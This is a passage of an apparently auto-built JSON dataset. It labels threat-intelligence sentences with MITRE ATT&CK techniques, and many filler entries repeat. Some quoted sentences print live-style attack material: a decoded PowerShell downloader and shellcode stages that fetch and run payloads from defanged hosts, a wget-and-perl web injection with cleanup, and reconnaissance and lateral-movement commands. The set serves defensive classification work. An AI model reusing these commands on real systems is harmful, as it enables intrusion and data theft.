    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    " query user",
    "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information."
  ],
  "standard application layer protocol masquerading launch agent-multi": {
    "technique_names": [
      "application layer protocol",
      "masquerading",
      "create or modify system process: launch agent"
    ],
    "sentances": [
      "Filename SHA256 Description   poisonfrog.ps1 27e03b98ae0f6f2650f378e9292384f1350f95ee4f3ac009e0113a8d9e2e14ed Dropper that installs hUpdater.ps1 and dUpdater.ps1   hUpdater.ps1 995ea68dcf27c4a2d482b3afadbd8da546d635d72f6b458557175e0cb98dd999 Poison Frog agent that uses HTTP for C2   dUpdater.ps1 0f20995d431abce885b8bd7dec1013cc1ef7c73886029c67df53101ea330436c Poison Frog \u00a0agent that uses DNS tunneling for C2    Table 3"
    ]
  },
  "permission groups discovery account discovery-multi": {
    "technique_names": ["permission groups discovery", "account discovery"],
    "sentances": [
      "The data dump included the 0000000000.bat file, which when executed on an infected system would run the following commands to gather information to be sent back to the C2 server:  whoami hostname ipconfig /all net user /domain net group /domain net group \u201cdomain admins\u201d /domain net group \u201cExchange Trusted Subsystem\u201d /domain net accounts /domain net user net localgroup administrators netstat -an tasklist systeminfo reg query \u201cHKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\u201d schtasks /query /FO List /TN \u201cGoogleUpdatesTaskMachineUI\u201d /V | findstr /b /n /c:\u201dRepeat: Every:\u201d WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List  This batch script is also interesting as it uses echo commands to include headers before each of the command results",
      "It has the following command line argument help: info\u00a0 <Server/Domain> [options] [options]: \u00a0 -d Domain \u00a0 -o OsInfo \u00a0 -t TsInfo \u00a0 -n NetuseInfo \u00a0 -s ShareInfo ShareDir \u00a0 -c Connect Test \u00a0 -a Local And Global Group User Info \u00a0 -l Local Group User Info \u00a0 -g Global Group User Info \u00a0 -ga Group Administrators \u00a0 -gp Group Power Users \u00a0 -gd Group Domain Admins \u00a0 -f <infile> //input server list from infile, OneServerOneLine info <\\\\server> <user> ChromePass: A tool from NirSoft used for recovering passwords stored in the Chrome browser"
    ]
  },
  "standard application layer protocol scripting-multi": {
    "technique_names": [
      "application layer protocol",
      "command and scripting interpreter"
    ],
    "sentances": [
      "The following HTTP request from the Helminth backdoor (SHA256: 1fb69090be8a2e11eeb220b26ee5eddf1e3fe81ffa59c47d47d01bf90c2b080c) downloaded the similar batch script: GET /update-index.aspx?req=1786873725%5Cbat&m=d HTTP/1.1 Host: update-kernal[.]net Connection: Keep-Alive We performed a code comparison to visualize the similarities between the batch script delivered as the default command in Poison Frog is to the script provided to the Helminth backdoor",
      "The URL used can be found in the embedded OLE object:hxxp://old[.]jrchina[.]com/btob_asiana/udel_calcel.php?fdid=[base64_data]Here is the source code of the downloaded HTA document:<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\" /><title>Bonjour</title><script language=\"VBScript\">Set owFrClN0giJ = CreateObject(\"Wscript.Shell\")Set v1ymUkaljYF = CreateObject(\"Scripting.FileSystemObject\")If v1ymUkaljYF.FileExists(owFrClN0giJ.ExpandEnvironmentStrings(\"%PSModulePath%\") + \"..\\powershell.exe\") ThenowFrClN0giJ.Run \"powershell -nop -windowstyle hidden -executionpolicy bypass -encodedcommand JABjAD0AbgBlAHcALQBvA[...redacted...]H0AIAA=\" ,0owFrClN0giJ.Run \"cmd /c echo hta>%tmp%\\webbrowser1094826604.tmp\", 0End IfSelf.Close</script><hta:applicationid=\"oHTA\"applicationname=\"Bonjour\"application=\"yes\"></head></html>Once decoded using the base64 algorithm, we are able to read the final payload:$c=new-object System.Net.WebClient$t =$env:temp$t1=$t+\"\\\\alitmp0131.jpg\"$t2=$t+\"\\\\alitmp0132.jpg\"$t3=$t+\"\\\\alitmp0133.js\"try  {    echo $c.DownloadFile( \"hxxp://old[.]jrchina[.]com/btob_asiana/appach01.jpg\",$t1)    $c.DownloadFile( \"hxxp://old[.]jrchina[.]com/btob_asiana/appach02.jpg\",$t2)    $c.DownloadFile( \"hxxp://old[.]jrchina[.]com/btob_asiana/udel_ok.ipp\",$t3)    wscript.exe $t3  }catch  {   }The purpose of this script is to download and execute a Windows script and two encoded payloads",
      "The assembly code used to create the shellcode can be obtained from: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_http.asm The purpose of the shellcode is to obtain additional shellcode to execute using an HTTP request to the URL \u201chxxp://45.76.128[.]165:4443/0w0O6\u201d"
    ]
  },
  "custom cryptographic protocol deobfuscate/decode files or information obfuscated files or information pass the hash data encoding-multi": {
    "technique_names": [
      "encrypted channel",
      "deobfuscate/decode files or information",
      "obfuscated files or information",
      "use alternate authentication material: pass the hash",
      "data encoding"
    ],
    "sentances": [
      "We determined this by following the process in which the TwoFace++ loader webshell uses the actor provided password to authenticate and decrypt the embedded webshell:  Append a string to the password that acts as a salt Obtain the SHA1 hash of the resulting string containing the password and salt Base64 encode the SHA1 hash Compare the encoded hash with hardcoded base64 string If the encoded hash matches hardcoded base64 string then the inbound request is authenticated Generates the SHA256 hash of the password string Base64 encodes the SHA256 hash and uses the first 24 characters as a key Uses 24-character key and the 3DES cipher to decrypt the embedded webshell  Now let\u2019s look at how this works with the values in the TwoFace++ loader sample"
    ]
  },
  "system owner/user discovery system network configuration discovery account discovery user execution-multi": {
    "technique_names": [
      "system owner/user discovery",
      "system network configuration discovery",
      "account discovery",
      "user execution"
    ],
    "sentances": [
      "The webshell will iterate through the IP list and perform a series of commands for each IP, starting off with using the following command to connect to the remote system: net use [IP address] /user:[domain admin username] [domain admin password] 2>&1 After connecting to the remote system with net use, the webshell will run the following command to obtain a list of user folders: dir /b [IP address]\\c$\\Users 2>&1 With a list of user folders, the webshell will iterate through the list of users and enumerate all of the files in the following folders: [IP address]\\c$\\Users\\[username]\\Desktop [IP address]\\c$\\Users\\[username]\\Documents [IP address]\\c$\\Users\\[username]\\Downloads The Network Downloader function will gather all the files in these folders and use 7-Zip to compress and archive the files"
    ]
  },
  "screen capture": [
    "Screenshots The data dump includes several screenshots of resources that the leaker alleged was related to the OilRig group",
    "Screenshot provided in leak showing administrative panel for hosting provider Berbid Server The screenshot showed the administrative panel for a VPS account on DeltaHost with four different virtual servers, as seen in Figure 20",
    "Screenshot in leak of administrative panel for an account at DeltaHost If we use the filename of this screenshot and assume that it was taken on March 29, 2019 and subtract 194 days from this date, it is possible that this server had been operational since at least September 16, 2018",
    "This screenshot is via an RDP session as indicated by the tab located at the top of the screen and is located at 164.132.67[.]216 which is hosted by OVH",
    "The malware can exfiltrate keystrokes, screenshots, browser-related data like cookies and history, decrypted when possible",
    "Malware features Remexi boasts features that allow it to gather keystrokes, take screenshots of windows of interest (as defined in its configuration), steal credentials, logons and the browser history, and execute remote commands",
    "Can capture all screen (\u201cAllScreen\u201d) or the active window (\u201cActiveWindow\u201d)   -ms Screenshot file name to save in Cache006 subdirectory, zipped with password from configuration",
    "The second email references a Hong Kong University alumni organization that fears votes in a referendum to appoint a Vice-Chancellor will be co-opted by pro-Beijing interests.[9]  Figure 1: Lure Screenshots The group\u2019s previous activities against financial and policy organizations have largely focused on spear phishing emails written in English, destined for Western audiences",
    "SCREEN Takes a PNG screenshot of the main screen and names the file with timestamps, then uploads it to the C2 server using POST at the path \u201c/FeedBack.php\u201d",
    "While sending to the C2 server, the data is formatted as follows: @{SYSINFO\u00a0 = $get.ToString(); ACTION = \"REGISTER\";}  Ability to take screenshots",
    "The \u201cscreenshot\u201d command takes a screenshot that is saved as a.PNG file in \u201cProgramData\u201c",
    "The screen capture below shows the decryption function.It then calls the StartAndPatchRegAsm function.This function tries to find the original Microsoft RegAsm executable path",
    "Figure 3: Screen capture of\u00a0the downloader executed on OS X El Capitan",
    "Interestingly, we\u2019ve seen recent samples embedding decoy documents that are screenshots of botnet C&C panels or dumps of credit card numbers",
    "The C2 server can also send a PowerShell command to capture and store a screenshot of a victim\u2019s system",
    "POWRUNER will send the captured screenshot image file to the C2 server if the \u201cfileupload\u201d command is issued",
    "The command handle looks for the following command strings in Table 3:    Command Description   $fileDownload Uploads the contents of a specified file to C2   $importModule Adds a specified PowerShell module to the current script   $screenshot Executes the contents of the command, which should be the string \u2018$screenshot\u2019",
    "23 Take screenshot, temporarily store it as TPX499.dat, and upload it to the C2",
    "Periodic low resolution screenshots",
    "SpyNote RAT captured the device\u2019s screen activities along with audio using the \u00a0MediaProjectionCallback\u00a0functionality (available with Lollipop, the Android 5.0 release, and later) and saved the output in a file named \"video.mp4\" as shown in the following\u00a0screenshot:          Figure 5\u00a0:\u00a0Output\u00a0File     SMS stealing\u00a0 SpyNote RAT was also observed stealing SMS messages from the affected devices, as shown in screenshot\u00a0below:          Figure 6:\u00a0Reading SMS\u00a0messages     Stealing\u00a0contacts The ability to steal contacts is a favorite feature for spyware developers, as the stolen contacts can be used to further spread the\u00a0spyware",
    "[Screenshot 1] Encrypted Login Packet sent by Gh0stRAT infected PC  In addition to a standard malware analysis blog post, I\u2019d also like to take this time to document and describe my methods for analysis, in the hopes that you as a reader will use these techniques in the future",
    "Returns the screenshot to the C2 via: <img src=\u2019data:image/jpeg;base64,[base64 of screenshot]\u2019 width=800 height=500 /><br>   111 startTakeScreenShot Creates a thread to take a screenshot at a set interval (default: every 10 seconds)",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "capture screenshot",
    "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)\n"
  ],
  "screen capture remote desktop protocol web shell-multi": {
    "technique_names": [
      "screen capture",
      "remote services: remote desktop protocol",
      "server software component: web shell"
    ],
    "sentances": [
      "The screenshots included remote desktop (RDP) sessions showing the Glimpse panel, a web browser session displaying a C2 panel called Scarecrow, web browser sessions into VPS administrative panels, and evidence of potential destructive attacks against OilRig servers"
    ]
  },
  "indicator removal on host": [
    "It also deletes Windows Event Logs : Application, Security, Setup, System",
    "This simply acts as cleanup to ensure original file artifacts no longer reside on the infected machine",
    "This is a guest post by independent security researcher James Quinn.\u00a0This will be Part 1 of a series titled Reversing Gh0stRAT Variants.\u00a0 As 2018 drew to a close and 2019 took over, I began to see a different behavior from SMB malware authors.\u00a0 Instead of massive, multi-staged cryptocurrency miners, I began to see more small, covert RATs serving as partial stage1\u2019s.\u00a0 Of these samples, there was one specific sample that stood out to me.\u00a0 A Gh0stRAT variant, this sample not only changed the Gh0stRAT header from \u201cGh0st\u201d to \u201cnbLGX\u201d, it also hid its traffic with an encryption algorithm over the entire TCP segment, in addition to the standard Zlib compression on the Gh0stRAT data.\u00a0 Some key functionality is below:   Can download more malware   Offline Keylogger   Cleans Event logs",
    "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred."
  ],
  "disabling security tools masquerading-multi": {
    "technique_names": [
      "impair defenses: disable or modify tools",
      "masquerading"
    ],
    "sentances": [
      "Once activated, this variant of the KillDisk component looks for and terminates two non-standard processes with the following names:  komut.exe sec_service.exe  We didn\u2019t manage to find any information regarding the name of the first process (komut.exe)"
    ]
  },
  "masquerading remote services-multi": {
    "technique_names": ["masquerading", "remote services"],
    "sentances": [
      "During our investigation of one of the compromised servers we found an application that, at first glance, appeared to be a legitimate SSH server called Dropbear SSH"
    ]
  },
  "input capture": [
    "The same situation applies to authentication by key pair \u2013 the server contains a pre-defined constant public key and it allows authentication only if a particular private key is used",
    "As mentioned previously, Buckeye also uses a number of hacking tools, including the following: Keylogger: The keylogger is configured using the command line parameters: NetworkService, Replace, Install, Register and Unregister",
    "The keylogger then records keystrokes in encrypted files, for example: thumbcache_96.dbx",
    "The malware initiates its main function of capturing user keystrokes and sending them to the control server using standard Windows networking APIs",
    "NetWire has a built-in keylogger that can capture inputs from peripheral devices such as USB card readers",
    "Example of decoded keylogger output",
    "It is commonly sold on various hacking forums as a keylogger and stealer that can be used to monitor systems and exfiltrate information from those systems",
    "Deobfuscated, we can see it is the HawkEye Keylogger \u2014 Reborn v9, Version=9.0.1.6",
    "8 Upload the TPX498.dat file, which contains the list of collected keystrokes",
    "63 64 ku64.dll ku32.dll Keylogger & clipboard monitor",
    "keylogger) may be missing for these platforms",
    "However, the campaign that the PDC has recently observed has been delivering this keylogger exclusively",
    "There does appear to be function names however, including PeekMessageA, which has been previously observed in other keylogging malware",
    "XAgent C2 Communications The macOS variant of XAgent has ability to receive commands from threat actors via its command and control channel, but is also capable of logging key strokes via its keylogger functionality",
    "Keylogging Functionality XAgent also has a keylogger functionality that allows the threat actors to steal credentials as the user types them",
    "This callback function will call a function named pressedKeyWithKeyCode, which is responsible for logging the keystrokes",
    "LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Window\u2019s temp folder.",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    "keylog ",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    " capture keystrokes",
    "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003))."
  ],
  "scripting obfuscated files or information remote file copy-multi": {
    "technique_names": [
      "command and scripting interpreter",
      "obfuscated files or information",
      "ingress tool transfer"
    ],
    "sentances": [
      "The first stage shellcode contains an interesting NOP sled with alternative instructions, which was most likely designed in such a way to avoid detection by antivirus products looking for large NOP blocks inside flash files: NOP sled composed of 0x90 and 0x91 opcodes The main purpose of the initial shellcode is to download second stage shellcode from hxxp://89.45.67[.]107/rss/5uzosoff0u.iaf"
    ]
  },
  "process hollowing scripting remote file copy-multi": {
    "technique_names": [
      "process injection: process hollowing",
      "command and scripting interpreter",
      "ingress tool transfer"
    ],
    "sentances": [
      "Second stage shellcode The second stage shellcode will then perform the following actions:  Download the final payload (FinSpy) from hxxp://89.45.67[.]107/rss/mo.exe Download a lure document to display to the victim from the same IP Execute the payload and display the lure document  Payload \u2013 mo.exe As mentioned earlier, the \u201cmo.exe\u201d payload (MD5: 4a49135d2ecc07085a8b7c5925a36c0a) is the newest version of Gamma International\u2019s FinSpy malware, typically sold to nation states and other law enforcement agencies to use in lawful surveillance operations.\u00a0 This newer variant has made it especially difficult for researchers to analyze the malware due to many added anti-analysis techniques, to include a custom packer and virtual machine to execute code"
    ]
  },
  "deobfuscate/decode files or information binary padding software packing virtualization/sandbox evasion-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "obfuscated files or information: binary padding",
      "obfuscated files or information: software packing",
      "virtualization/sandbox evasion: system checks"
    ],
    "sentances": [
      "Part of packed VM PCODE After unpacking, the PCODE it will look like the following: Unpacked PCODE After unpacking the virtual machine PCODE is then decrypted: Decrypted VM PCODE The custom virtual machine supports a total of 34 instructions: Example of parsed PCODE In this example, the \u201c1b\u201d instruction is responsible for executing native code that is specified in parameter field"
    ]
  },
  "process injection dll search order hijacking dll side-loading-multi": {
    "technique_names": [
      "process injection",
      "hijack execution flow: dll search order hijacking",
      "hijack execution flow: dll side-loading"
    ],
    "sentances": [
      "Once the payload is successfully executed, it will proceed to copy files to the following locations:  C:\\ProgramData\\ManagerApp\\AdapterTroubleshooter.exe C:\\ProgramData\\ManagerApp\\15b937.cab C:\\ProgramData\\ManagerApp\\install.cab C:\\ProgramData\\ManagerApp\\msvcr90.dll C:\\ProgramData\\ManagerApp\\d3d9.dll  The \u201cAdapterTroubleshooter.exe\u201d file is a legitimate binary which is leveraged to use the famous DLL search order hijacking technique.\u00a0 The \u201cd3d9.dll\u201d file is malicious and is loaded into memory by the legit binary upon execution.\u00a0 Once loaded, the DLL will then inject FinSpy into the Winlogon process",
      "APIs from the following libraries are loaded at runtime:  Kernel32.dll Ws2_32/wsock32.dll Apvapi32.dll Oleaut32.dll Iphlp.dll Urlmon.dll  A dynamic API loaded by the malware",
      "13 14 ams_api64.dll ams_api32.dll Handy wrapper around API of exXX.dll, pdXX.dll, sgXX.dll"
    ]
  },
  "hijack execution flow: dll side-loading": [
    "(Source: SecureWorks) Some payloads leveraged DLL side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious DLL",
    "Figure 1 Side-by-side of the lure images within ThreeDollars in the October 2017 and the January 2018 attacks \u00a0 Superficially, we can immediately see the images are quite similar, but with some glaring differences",
    "The technique of having a signed, legitimate, executable load a malicious library is commonly referred to as side-loading, and has been witnessed in a number of campaigns and malware families in the past",
    "DLL side loading is often used to maintain persistence on the compromised system",
    "DLL side loading has been used to maintain persistence on the compromised system",
    "Hunter queried the following URIs in a specific order to determine if the associated software configurations are insecure, and all queries contained the HttpClient User-Agent:  GET /manager/html/ \u2014 Tomcat web application manager GET /jmx-console/ \u2014 JBoss configuration GET /CFIDE/administrator/login.cfm \u2014 ColdFusion configuration  Installation TG-3390 uses DLL side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious DLL",
    "Note: DLL side loading is a prevalent persistence technique that is used to launch a multitude of backdoors",
    "As security controls have improved, DLL side loading has evolved to load a payload stored in a different directory or from a registry value",
    "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)"
  ],
  "disabling security tools file deletion-multi": {
    "technique_names": [
      "impair defenses: disable or modify tools",
      "indicator removal on host: file deletion"
    ],
    "sentances": [
      "In 2016, CTU researchers observed the group using native system functionality to disable logging processes and delete logs within a compromised environment",
      "Threat actor using appcmd to delete logs and disable logging"
    ]
  },
  "data staged web shell data encoding-multi": {
    "technique_names": [
      "data staged",
      "server software component: web shell",
      "data encoding"
    ],
    "sentances": [
      "Exfiltration BRONZE UNION has also leveraged various web shells to collect and stage data for exfiltration"
    ]
  },
  "file deletion data staged-multi": {
    "technique_names": [
      "indicator removal on host: file deletion",
      "data staged"
    ],
    "sentances": [
      "In the following example, archives for exfiltration were renamed as .tmp files:  move \\\\{FILE PATH}\\c$\\programdata\\AT.part01.rar  \\\\{FILE PATH}\\c$\\programdata\\at01.tmp The TMP files were then staged for exfiltration on Internet-facing servers that had previously been compromised with the China Chopper web shell",
      "!ExeCuteFile Executes a specified file using ShellExecuteA   !DeleteFileFolder Deletes a file or a folder   !SendkeyLogToServer Uploads the %TEMP%\\Save.tmp file to the C2 server   !DeleteKeyloggerLog Deletes the %TEMP%\\Save.tmp file on the system    Table 2 Commands available within MPK IRC Bot \u00a0 The post Magic Hound Campaign Attacks Saudi Targets appeared first on Palo Alto Networks Blog",
      "Serving the backdoor  Another HTTP request is sent to the targeted server, with the following resource: /?module=wget hxxp://67[.]209.177.163/ibus -O /tmp/e3ac24a0bcddfacd010a6c10f4a814bc The above standard injection pulls the ibus payload and stores it on /tmp/e3ac24a0bcddfacd010a6c10f4a814bc  Launching the backdoor  The execution is issued using an additional HTTP request: /?module=perl /tmp/ e3ac24a0bcddfacd010a6c10f4a814bc;sleep 2;rm -rf /tmp/ e3ac24a0bcddfacd010a6c10f4a814bc That executes the perl script, puts it to sleep for two seconds and deletes the file to remove any evidence"
    ]
  },
  "file deletion web shell-multi": {
    "technique_names": [
      "indicator removal on host: file deletion",
      "server software component: web shell"
    ],
    "sentances": [
      "From those servers the threat actor could use a web shell to retrieve the encrypted archives:  copy \\\\{FILE PATH}\\c$\\programdata\\*.tmp \\\\{FILE PATH}\\ServiceDesk\\custom\\style After exfiltrating the files, the threat actor used web shell access on the staging server to delete the staged RAR archives and detach their network shares, likely to avoid detection"
    ]
  },
  "web shell windows admin shares-multi": {
    "technique_names": [
      "server software component: web shell",
      "remote services: smb/windows admin shares"
    ],
    "sentances": [
      "Advanced endpoint threat detection (AETD) can help detect activity associated with web shells and lateral movement, and network technologies that use sandboxing techniques to detonate binaries in network traffic can prevent malicious traffic from reaching internal systems"
    ]
  },
  "timestomp scheduled task binary padding remote services system network configuration discovery indicator removal on host web service brute force dll side-loading web shell pass the hash drive-by compromise-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "scheduled task/job",
      "obfuscated files or information: binary padding",
      "remote services",
      "system network configuration discovery",
      "indicator removal on host",
      "web service",
      "brute force",
      "hijack execution flow: dll side-loading",
      "server software component: web shell",
      "use alternate authentication material: pass the hash",
      "drive-by compromise"
    ],
    "sentances": [
      "Indicator   Type   Context       198.56.185.179   IP address   Used by BRONZE UNION to connect to China Chopper web shell     211.255.155.194   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     211.255.155.199   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     211.255.155.202   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     211.255.155.204   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     211.255.155.215   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     211.255.155.218   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     211.255.155.219   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     211.255.155.224   IP address   Likely associated with VPN used by BRONZE UNION to connect to China Chopper web shell     104.130.244.126   IP address   Used by BRONZE UNION to connect to web shells     96.90.63.57   IP address   Used by BRONZE UNION to connect to web shells     117.136.63.145   IP address   Used by BRONZE UNION to connect to web shells     cd5aaa37ee165071f914ceec8fd09e0f   MD5 hash   OwaAuth web shell used by BRONZE UNION     2b5aa30f8f0575bdfe1ddebc8dac8c56a91137a8   SHA1 hash   OwaAuth web shell used by BRONZE UNION     0e823a5b64ee761b70315548d484b5b9c4b61968b5068f9a8687c612ddbfeb80   SHA256 hash   OwaAuth web shell used by BRONZE UNION     javaws.exe   Filename   Malware used in BRONZE UNION SWC that downloads and executes a second-stage payload     98c5f2a680fe9de19683120be90ea75c   MD5 hash   Malware used in BRONZE UNION SWC (javaws.exe)F     daa03d4aa72a16fff910142982b057b195018e6d   SHA1 hash   Malware used in BRONZE UNION SWC (javaws.exe)     ec60e57419f24fabbe67451cb1055b3d2684ab2534cd55c4a88cc395f9ed1b09   SHA256 hash   Malware used in BRONZE UNION SWC (javaws.exe)     45.114.9.174   IP address   Used by BRONZE UNION to host second-stage payload for SWC     Table 1"
    ]
  },
  "security software discovery data from local system deobfuscate/decode files or information file deletion file and directory discovery exfiltration over command and control channel data compressed uncommonly used port access token manipulation fallback channels-multi": {
    "technique_names": [
      "software discovery: security software discovery",
      "data from local system",
      "deobfuscate/decode files or information",
      "indicator removal on host: file deletion",
      "file and directory discovery",
      "exfiltration over c2 channel",
      "archive collected data",
      "non-standard port",
      "access token manipulation",
      "fallback channels",
      "non-standard port"
    ],
    "sentances": [
      "Symantec and Norton products offer the following detections: Antivirus  Backdoor.Pirpi Backdoor.Pirpi!dr Backdoor.Pirpi!gen1 Backdoor.Pirpi!gen2 Backdoor.Pirpi!gen3 Backdoor.Pirpi!gen4 Backdoor.Pirpi.A Backdoor.Pirpi.B Backdoor.Pirpi.C Backdoor.Pirpi.D Downloader.Pirpi Downloader.Pirpi!g1  Intrusion prevention system  System Infected: Backdoor.Pirpi Activity 3  Update\u2013September 14, 2016: Indicators of compromise We have compiled a list of indicators of compromise for the campaigns described in this blog"
    ]
  },
  "scheduled task registry run keys / startup folder-multi": {
    "technique_names": [
      "scheduled task/job",
      "boot or logon autostart execution: registry run keys / startup folder"
    ],
    "sentances": [
      "The malware utilizes several persistence mechanisms including scheduled tasks, Userinit and Run registry keys in the HKLM hive",
      "Persistence Mechanism Figure 3 shows that for persistence, the document creates two scheduled tasks and creates one auto-start registry entry pointing to the LNK file"
    ]
  },
  "standard application layer protocol data encoding-multi": {
    "technique_names": ["application layer protocol", "data encoding"],
    "sentances": [
      "For both the receiving of C2 commands and exfiltration, Remexi uses the Microsoft Background Intelligent Transfer Service (BITS) mechanism to communicate with the C2 over HTTP"
    ]
  },
  "disabling security tools file and directory discovery-multi": {
    "technique_names": [
      "impair defenses: disable or modify tools",
      "file and directory discovery"
    ],
    "sentances": [
      "Remexi includes different modules that it deploys in its working directory, including configuration decryption and parsing, launching victim activity logging in a separate module, and seven threads for various espionage and auxiliary functions"
    ]
  },
  "scheduled task/job": [
    "Send exfiltrated data   taskkill.exe Ends working cycle of modules    Persistence Persistence modules are based on scheduled tasks and system registry",
